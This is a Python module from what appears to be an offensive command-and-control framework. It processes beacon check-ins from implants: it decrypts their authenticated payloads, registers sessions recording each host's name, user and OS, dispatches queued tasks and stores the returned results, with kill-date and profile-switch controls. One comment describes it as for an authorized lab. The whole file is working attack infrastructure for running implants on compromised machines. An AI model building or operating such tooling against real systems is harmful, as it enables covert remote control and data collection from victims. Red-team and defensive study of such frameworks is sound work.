"""Shared HTTP beacon check-in / result handling (profile-aware)."""

from __future__ import annotations

import time
from typing import Any

from squidc5.core.state import AppState
from squidc5.implants.crypto import is_envelope, open_envelope, seal


def _unwrap_payload(state: AppState, payload: dict[str, Any]) -> dict[str, Any]:
    """Decrypt AEAD envelope when present / required."""
    require = bool(getattr(state.settings, "implant_require_auth", True))
    psk = getattr(state, "implant_psk", "") or ""
    if is_envelope(payload):
        if not psk:
            raise PermissionError("Implant PSK not configured")
        try:
            return open_envelope(psk, payload)
        except Exception as e:
            raise PermissionError("Invalid implant authentication") from e
    if require:
        raise PermissionError("Authenticated implant envelope required")
    return payload


def _wrap_response(state: AppState, result: dict[str, Any]) -> dict[str, Any]:
    require = bool(getattr(state.settings, "implant_require_auth", True))
    psk = getattr(state, "implant_psk", "") or ""
    if require and psk:
        return seal(psk, result)
    return result


async def process_beacon_checkin(
    state: AppState,
    *,
    remote_addr: str | None,
    payload: dict[str, Any],
    user_agent: str | None = None,
    listener_id: str | None = None,
) -> dict[str, Any]:
    """Register/heartbeat beacon session and return next task."""
    if not await state.features.enabled("implant_beacon"):
        raise PermissionError("Implant beacon is disabled by feature flag")

    payload = _unwrap_payload(state, payload)

    session_id = payload.get("session_id")
    hostname = payload.get("hostname")
    username = payload.get("username")
    os_info = payload.get("os_info")
    metadata = payload.get("metadata") if isinstance(payload.get("metadata"), dict) else {}
    if user_agent and "user_agent" not in metadata:
        metadata = {**metadata, "user_agent": user_agent}
    if listener_id:
        metadata = {**metadata, "listener_id": listener_id}

    # Lifecycle controls from implant payload (authorized lab)
    if payload.get("kill_date") is not None:
        try:
            metadata = {**metadata, "kill_date": float(payload["kill_date"])}
        except (TypeError, ValueError):
            pass
    if payload.get("max_missed_checkins") is not None:
        try:
            metadata = {
                **metadata,
                "max_missed_checkins": int(payload["max_missed_checkins"]),
            }
        except (TypeError, ValueError):
            pass

    if session_id:
        existing = await state.sessions.get(session_id)
        if existing and existing["status"] == "active":
            meta = existing.get("metadata") if isinstance(existing.get("metadata"), dict) else {}
            kill = meta.get("kill_date")
            if kill is not None and time.time() > float(kill):
                await state.sessions.close(session_id)
                raise PermissionError("Implant kill date exceeded")
            await state.sessions.heartbeat(
                session_id,
                hostname=hostname,
                username=username,
                os_info=os_info,
            )
            # reset miss counter on successful check-in
            if "missed_checkins" in meta or metadata:
                merged = {**meta, **metadata, "missed_checkins": 0}
                await state.sessions.heartbeat(session_id, metadata=merged)
            sid = session_id
        else:
            sid = await state.sessions.register(
                kind="beacon",
                remote_addr=remote_addr,
                hostname=hostname,
                username=username,
                os_info=os_info,
                metadata=metadata,
                listener_id=listener_id,
            )
    else:
        sid = await state.sessions.register(
            kind="beacon",
            remote_addr=remote_addr,
            hostname=hostname,
            username=username,
            os_info=os_info,
            metadata=metadata,
            listener_id=listener_id,
        )
    task = await state.tasks.poll(sid)
    await state.metrics.incr("implant.beacon")
    out: dict[str, Any] = {"session_id": sid, "task": task}
    # C11: push active profile id for runtime switch (implant may re-pull config)
    active = state.profiles.active()
    if active:
        out["profile_id"] = active.id
        out["profile_version"] = active.version
    return _wrap_response(state, out)


async def process_beacon_result(state: AppState, payload: dict[str, Any]) -> dict[str, str]:
    payload = _unwrap_payload(state, payload)
    task_id = payload.get("task_id")
    if not task_id:
        raise ValueError("task_id required")
    result = payload.get("result")
    if result is None:
        result = ""
    status = payload.get("status") or "completed"
    await state.tasks.complete(str(task_id), str(result), str(status))
    return _wrap_response(state, {"status": "ok"})  # type: ignore[return-value]
